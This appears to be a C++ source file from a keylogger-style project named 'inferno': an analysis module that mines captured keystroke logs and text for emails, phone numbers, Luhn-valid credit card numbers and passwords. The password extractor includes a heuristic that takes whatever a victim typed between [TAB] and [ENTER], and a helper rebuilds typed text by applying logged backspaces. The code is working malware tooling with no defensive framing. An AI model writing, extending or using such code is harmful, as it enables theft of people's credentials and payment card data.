#include "../../include/services/Analysis.hpp"
#include <regex>
#include <cctype>
#include <iostream>

namespace inferno {

bool Analysis::validateLuhn(const std::string& card_number) {
    std::string digits;
    digits.reserve(card_number.length());
    
    // Strip non-digits
    for (char c : card_number) {
        if (std::isdigit(static_cast<unsigned char>(c))) {
            digits.push_back(c);
        }
    }
    
    if (digits.empty()) {
        return false;
    }

    int sum = 0;
    bool alternate = false;
    
    // Modulo 10 Luhn checksum logic (right-to-left)
    for (int i = static_cast<int>(digits.length()) - 1; i >= 0; --i) {
        int n = digits[i] - '0';
        if (alternate) {
            n *= 2;
            if (n > 9) {
                n -= 9;
            }
        }
        sum += n;
        alternate = !alternate;
    }
    
    return (sum % 10 == 0);
}

std::vector<std::string> Analysis::extractEmails(const std::string& text) {
    std::vector<std::string> results;
    try {
        // Standard email regex pattern
        std::regex email_regex(R"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})");
        std::regex_iterator<std::string::const_iterator> it(text.begin(), text.end(), email_regex);
        std::regex_iterator<std::string::const_iterator> end;
        
        while (it != end) {
            results.push_back(it->str());
            ++it;
        }
    } catch (const std::regex_error& e) {
        std::cerr << "[Analysis] Regex error in extractEmails: " << e.what() << std::endl;
    }
    return results;
}

std::vector<std::string> Analysis::extractPhones(const std::string& text) {
    std::vector<std::string> results;
    try {
        std::regex phone_regex(R"(\+?\b[0-9]{1,4}(?:[-.\s]?\(?[0-9]{1,4}\)?){1,5}\b)");
        std::regex_iterator<std::string::const_iterator> it(text.begin(), text.end(), phone_regex);
        std::regex_iterator<std::string::const_iterator> end;
        
        while (it != end) {
            std::string match_str = it->str();

            // Filter out false positives (IP addresses, Dates, or Timestamps)
            static const std::regex ip_pattern(R"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)");
            static const std::regex date_pattern(R"(\b\d{4}-\d{2}-\d{2}\b|\b\d{2}-\d{2}-\d{4}\b)");
            static const std::regex time_pattern(R"(\b\d{2}[.:]\d{2}[.:]\d{2}\b)");

            if (std::regex_search(match_str, ip_pattern) ||
                std::regex_search(match_str, date_pattern) ||
                std::regex_search(match_str, time_pattern)) {
                ++it;
                continue;
            }
            
            // Validate that we have at least 7 digits to prevent false positives like short year spans or dates
            int digit_count = 0;
            for (char c : match_str) {
                if (std::isdigit(static_cast<unsigned char>(c))) {
                    digit_count++;
                }
            }
            if (digit_count >= 7 && digit_count <= 15) {
                results.push_back(match_str);
            }
            ++it;
        }
    } catch (const std::regex_error& e) {
        std::cerr << "[Analysis] Regex error in extractPhones: " << e.what() << std::endl;
    }
    return results;
}

std::vector<std::string> Analysis::extractCreditCards(const std::string& text) {
    std::vector<std::string> results;
    try {
        // Credit card sequence extractor (13 to 19 digits separated by spaces or dashes)
        std::regex card_regex(R"(\b\d(?:[ -]?\d){12,18}\b)");
        std::regex_iterator<std::string::const_iterator> it(text.begin(), text.end(), card_regex);
        std::regex_iterator<std::string::const_iterator> end;
        
        while (it != end) {
            std::string candidate = it->str();
            if (validateLuhn(candidate)) {
                results.push_back(candidate);
            }
            ++it;
        }
    } catch (const std::regex_error& e) {
        std::cerr << "[Analysis] Regex error in extractCreditCards: " << e.what() << std::endl;
    }
    return results;
}

std::vector<std::pair<std::string, std::string>> Analysis::extractPasswords(const std::string& text) {
    std::vector<std::pair<std::string, std::string>> results;
    
    // Heuristic 1: Keyword-based matches (case insensitive)
    try {
        std::regex pw_keyword_regex(
            R"(\b(?:password|passwd|pwd|pass)\b\s*[:=]\s*([^\s\[\]\r\n]{3,64}))",
            std::regex_constants::ECMAScript | std::regex_constants::icase
        );
        std::regex_iterator<std::string::const_iterator> it(text.begin(), text.end(), pw_keyword_regex);
        std::regex_iterator<std::string::const_iterator> end;
        
        while (it != end) {
            if (it->size() > 1) {
                // First capture group is the password candidate
                results.push_back({it->str(1), "Keyword Context: " + it->str()});
            }
            ++it;
        }
    } catch (const std::regex_error& e) {
        std::cerr << "[Analysis] Regex error in password keyword search: " << e.what() << std::endl;
    }

    // Heuristic 2: Keylogger typing sequence tab-to-enter (username [TAB] password [ENTER])
    try {
        std::regex keylog_seq_regex(R"(\[TAB\]([^\[\]\s\r\n]{3,64})\[ENTER\])");
        std::regex_iterator<std::string::const_iterator> it(text.begin(), text.end(), keylog_seq_regex);
        std::regex_iterator<std::string::const_iterator> end;
        
        while (it != end) {
            if (it->size() > 1) {
                results.push_back({it->str(1), "Keylog Sequence: [TAB]" + it->str(1) + "[ENTER]"});
            }
            ++it;
        }
    } catch (const std::regex_error& e) {
        std::cerr << "[Analysis] Regex error in password sequence search: " << e.what() << std::endl;
    }
    
    return results;
}

std::string Analysis::filterBackspaces(const std::string& keystrokes) {
    std::vector<std::string> tokens;
    size_t i = 0;
    size_t len = keystrokes.length();
    while (i < len) {
        if (keystrokes[i] == '[') {
            size_t close_pos = keystrokes.find(']', i + 1);
            if (close_pos != std::string::npos) {
                size_t next_open = keystrokes.find('[', i + 1);
                if (next_open == std::string::npos || next_open > close_pos) {
                    std::string tag = keystrokes.substr(i, close_pos - i + 1);
                    if (tag == "[BACKSPACE]") {
                        if (!tokens.empty()) {
                            tokens.pop_back();
                        }
                    } else {
                        tokens.push_back(tag);
                    }
                    i = close_pos + 1;
                    continue;
                }
            }
        }
        
        std::string single_char(1, keystrokes[i]);
        tokens.push_back(single_char);
        i++;
    }
    
    std::string result;
    for (const auto& token : tokens) {
        result += token;
    }
    return result;
}

} // namespace inferno
